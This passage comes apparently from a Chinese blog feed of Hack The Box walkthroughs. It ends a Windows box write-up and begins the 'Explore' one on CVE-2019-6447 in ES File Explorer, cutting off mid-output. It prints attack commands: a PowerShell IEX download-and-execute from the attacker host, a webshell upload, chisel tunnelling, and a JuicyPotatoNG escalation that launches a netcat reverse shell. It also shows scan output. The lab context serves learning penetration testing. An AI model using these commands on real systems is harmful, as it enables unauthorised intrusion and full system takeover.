<br></code></pre></td></tr></table></figure><h3 id="Get-System"><a href="#Get-System" class="headerlink" title="Get System:"></a>Get System:</h3><p>执行本地端口发现有个8000端口号：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">PS C:\Windows\system32&gt; netstat -ano|findstr TCP<br>netstat -ano|findstr TCP<br>  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4276<br>  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       656<br>  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       916<br>  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       656<br>  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       4276<br>  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4<br>  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       656<br>  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       916<br>  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       656<br>  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       656<br>  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       656<br>  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4<br>  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       4<br>  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2732<br>  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4<br></code></pre></td></tr></table></figure><p>尝试利用chisel端口转发：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">PS C:\Users\svc_apache\Desktop&gt; curl http://10.10.16.15/chisel.exe -o chisel.exe        <br>PS C:\Users\svc_apache\Desktop&gt; .\chisel.exe client --max-retry-count=1 10.10.16.15:8080 R:8000:127.0.0.1:8000<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/Public/PostPayload/chisel$ ./chisel_1.7.7_linux_amd64 server --reverse<br>2022/12/27 13:35:15 server: Reverse tunnelling enabled<br>2022/12/27 13:35:15 server: Fingerprint pmP4JheOUJCqLrdd+k/kw9NHFb6CGYM4QZL+eUqW4VI=<br>2022/12/27 13:35:15 server: Listening on http://0.0.0.0:8080<br>2022/12/27 13:35:42 server: session<span class="hljs-comment">#1: tun: proxy#R:127.0.0.1:1080=&gt;socks: Listening</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20221227140035205.png" alt="image-20221227140035205"></p><p>这个目录和C:\inetpub\development是对应的，我可以在该目录下上传个webshell,webshell每过段时间就会消失，所以要抓紧时间弹个shell：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell.exe <span class="hljs-built_in">IEX</span>(<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://10.10.16.15:81/shell.ps1&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:/usr/share/webshells/powershell$ nc -lvnp 9001<br>Listening on 0.0.0.0 9001<br>Connection received on 10.10.11.187 50052<br><span class="hljs-built_in">ls</span><br><br><br>    Directory: C:\inetpub\development<br><br><br>Mode                LastWriteTime         Length Name                                                                  <br>----                -------------         ------ ----                                                                  <br>d-----       12/27/2022   5:32 AM                css                                                 <br>d-----       12/27/2022   5:32 AM                fonts                                               <br>d-----       12/27/2022   5:32 AM                img                                                 <br>d-----       12/27/2022   5:32 AM                js                                                   <br>-a----        4/16/2018   2:23 PM           9371 contact.html                                         <br>-a----        4/16/2018   2:23 PM          45949 index.html                                           <br>-a----       12/27/2022   5:32 AM            444 shell.aspx                                           <br>PS C:\inetpub\development&gt; <span class="hljs-built_in">whoami</span><br>iis apppool\defaultapppool<br>PS C:\inetpub\development&gt; <br></code></pre></td></tr></table></figure><p>可以用JuicyPotatoNG提权：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">PS C:\ProgramData&gt; curl http://10.10.16.15/nc64.exe -o nc64.exe<br>PS C:\ProgramData&gt; .\JuicyPotatoNG.exe -t * -p <span class="hljs-string">&quot;C:\ProgramData\nc64.exe&quot;</span> -a <span class="hljs-string">&quot;10.10.16.15 9002 -e cmd.exe&quot;</span><br>PS C:\ProgramData&gt; <br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:/usr/share/webshells/powershell$ nc -lvnp 9002<br>Listening on 0.0.0.0 9002<br>Connection received on 10.10.11.187 50081<br>Microsoft Windows [Version 10.0.17763.2989]<br>(c) 2018 Microsoft Corporation. All rights reserved.<br><br>C:\&gt;<span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>nt authority\system<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Active Directory</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Explore</title>
    <link href="/post/HackTheBox-Explore.html"/>
    <url>/post/HackTheBox-Explore.html</url>
    
    <content type="html"><![CDATA[<h4 id="HTB-Walkthrough-Explore"><a href="#HTB-Walkthrough-Explore" class="headerlink" title="HTB Walkthrough - Explore"></a>HTB Walkthrough - Explore</h4><h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-05-18 01:14:08 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 35147/tcp on 10.10.10.247                                 <br>Discovered open port 59777/tcp on 10.10.10.247                                 <br>Discovered open port 2222/tcp on 10.10.10.247                                  <br>Discovered open port 42135/tcp on 10.10.10.247  <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sC -sV 10.10.10.247 -p35147,59777,2222,42135 <br>Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-18 09:17 CST<br>Stats: 0:01:23 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan<br>Service scan Timing: About 75.00% <span class="hljs-keyword">done</span>; ETC: 09:19 (0:00:27 remaining)<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.247<br>Host is up (0.12s latency).<br><br>PORT      STATE    SERVICE VERSION<br>2222/tcp  open     ssh     (protocol 2.0)<br>| fingerprint-strings: <br>|   NULL: <br>|_    SSH-2.0-SSH Server - Banana Studio<br>| ssh-hostkey: <br>|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)<br>35147/tcp open     unknown<br>| fingerprint-strings: <br>|   GenericLines: <br>|     HTTP/1.0 400 Bad Request<br>|     Date: Wed, 18 May 2022 01:17:44 GMT<br>|     Content-Length: 22<br>|     Content-Type: text/plain; charset=US-ASCII<br>|     Connection: Close<br>|     Invalid request line:<br>|   GetRequest: <br>|     HTTP/1.1 412 Precondition Failed<br>|     Date: Wed, 18 May 2022 01:17:44 GMT<br>|     Content-Length: 0<br>|   HTTPOptions: <br>|     HTTP/1.0 501 Not Implemented<br>|     Date: Wed, 18 May 2022 01:17:50 GMT<br>|     Content-Length: 29<br>|     Content-Type: text/plain; charset=US-ASCII<br>|     Connection: Close<br>|     Method not supported: OPTIONS<br>|   Help: <br>|     HTTP/1.0 400 Bad Request<br>|     Date: Wed, 18 May 2022 01:18:07 GMT<br>|     Content-Length: 26<br>|     Content-Type: text/plain; charset=US-ASCII<br>|     Connection: Close<br>|     Invalid request line: HELP<br>|   RTSPRequest: <br>|     HTTP/1.0 400 Bad Request<br>|     Date: Wed, 18 May 2022 01:17:50 GMT<br>|     Content-Length: 39<br>|     Content-Type: text/plain; charset=US-ASCII<br>|     Connection: Close<br>|     valid protocol version: RTSP/1.0<br>|   SSLSessionReq: <br>|     HTTP/1.0 400 Bad Request<br>|     Date: Wed, 18 May 2022 01:18:08 GMT<br>|     Content-Length: 73<br>|     Content-Type: text/plain; charset=US-ASCII<br>|     Connection: Close<br>|     Invalid request line: <br>|     ?G???,???`~?<br>|     ??&#123;????w????&lt;=?o?<br>|   TLSSessionReq: <br>|     HTTP/1.0 400 Bad Request<br>|     Date: Wed, 18 May 2022 01:18:09 GMT<br>|     Content-Length: 71<br>|     Content-Type: text/plain; charset=US-ASCII<br>|     Connection: Close<br>|     Invalid request line: <br>|     ??random1random2random3random4<br>|   TerminalServerCookie: <br>|     HTTP/1.0 400 Bad Request<br>|     Date: Wed, 18 May 2022 01:18:08 GMT<br>|     Content-Length: 54<br>|     Content-Type: text/plain; charset=US-ASCII<br>|     Connection: Close<br>|     Invalid request line: <br>|_    Cookie: mstshash=nmap<br>42135/tcp open     http    ES File Explorer Name Response httpd<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html).</span><br><span class="hljs-string">59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older</span><br><span class="hljs-string">|_http-title: Site doesn&#x27;</span>t have a title (text/plain).<br>2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>..........................<br>==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============<br>Squest\r\nDa<br>SF:te:\x20Wed,\x2018\x20May\x202022\x2001:18:07\x20GMT\r\nContent-Length:\<br>SF:x2026\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection<br>SF::\x20Close\r\n\r\nInvalid\x20request\x20line:\x20HELP<span class="hljs-string">&quot;)%r(SSLSessionReq</span><br><span class="hljs-string">SF:,DD,&quot;</span>HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Wed,\x2018\x20May\x<br>SF:202022\x2001:18:08\x20GMT\r\nContent-Length:\x2073\r\nContent-Type:\x20<br>.............................<br>Service Info: Device: phone<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 116.23 seconds<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220518092546996.png" alt="image-20220518092546996"  /><p>适用于Android的ES文件浏览器文件管理器应用程序是一款基于Android系统的多功能手机文件，程序和进程管理器，它支持在手机，电脑，远程和蓝牙间浏览管理文件。基于Android平台的ES文件浏览器文件管理器应用程序4.1.9.7.4及之前版本中存在安全漏洞，该漏洞源于ES应用程序在运行一次之后（CVE-2019-6447），该端口并未关闭依旧可以通过HTTP协议接收JSON数据。攻击者可通过向TCP 59777端口发送请求利用该漏洞读取任意文件或执行应用程序。漏洞影响版本：4.1.9.7.4及以下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; curl 10.10.10.247:59777 -d <span class="hljs-string">&#x27;&#123;&quot;command&quot;: &quot;listFiles&quot;&#125;&#x27;</span><br>[<br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;lib&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;3/25/20 05:12:02 AM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;folder&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;12.00 KB (12,288 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;vndservice_contexts&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;65.00 Bytes (65 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;vendor_service_contexts&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;0.00 Bytes (0 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;vendor_seapp_contexts&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;0.00 Bytes (0 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;vendor_property_contexts&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;392.00 Bytes (392 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;vendor_hwservice_contexts&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;0.00 Bytes (0 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;vendor_file_contexts&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;6.92 KB (7,081 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;vendor&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;3/25/20 12:12:33 AM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;folder&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;4.00 KB (4,096 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;ueventd.rc&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;5.00 KB (5,122 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;ueventd.android_x86_64.rc&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;464.00 Bytes (464 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;3/25/20 12:12:31 AM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;folder&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;4.00 KB (4,096 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;sys&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;folder&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;0.00 Bytes (0 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;storage&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;5/17/22 09:13:07 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;folder&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;80.00 Bytes (80 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;sepolicy&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;357.18 KB (365,756 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;sdcard&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;4/21/21 02:12:29 AM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;folder&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;4.00 KB (4,096 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;sbin&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;folder&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;140.00 Bytes (140 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;product&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;3/24/20 11:39:17 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;folder&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;4.00 KB (4,096 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;proc&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;5/17/22 09:13:02 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;folder&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;0.00 Bytes (0 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;plat_service_contexts&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;13.73 KB (14,057 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;plat_seapp_contexts&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;1.28 KB (1,315 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;plat_property_contexts&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;6.53 KB (6,687 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;plat_hwservice_contexts&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;7.04 KB (7,212 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;plat_file_contexts&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;23.30 KB (23,863 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;oem&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;folder&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;40.00 Bytes (40 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;odm&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;folder&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;220.00 Bytes (220 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;mnt&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;5/17/22 09:13:04 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;folder&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;240.00 Bytes (240 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;init.zygote64_32.rc&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;875.00 Bytes (875 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;init.zygote32.rc&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;511.00 Bytes (511 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;init.usb.rc&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;5.51 KB (5,646 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;init.usb.configfs.rc&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;7.51 KB (7,690 Bytes)&quot;</span>, &#125;, <br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;init.superuser.rc&quot;</span>, <span 